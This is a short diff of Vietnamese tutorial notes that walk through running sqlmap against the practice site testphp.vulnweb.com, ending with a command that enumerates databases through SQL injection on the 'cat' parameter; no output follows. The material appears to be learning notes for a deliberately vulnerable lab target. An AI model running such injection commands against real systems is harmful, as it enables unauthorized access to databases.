@@ -1,6 +1,7 @@
 trang:  http://testphp.vulnweb.com/listproducts.php?cat=1
 
-mở cmd gõ cd C:\Python27\ArcGIS10.1\sqlmap
+mở cmd và copy các lệnh: 
+cd C:\Python27\ArcGIS10.1\sqlmap
 
 1.python sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
 Database:
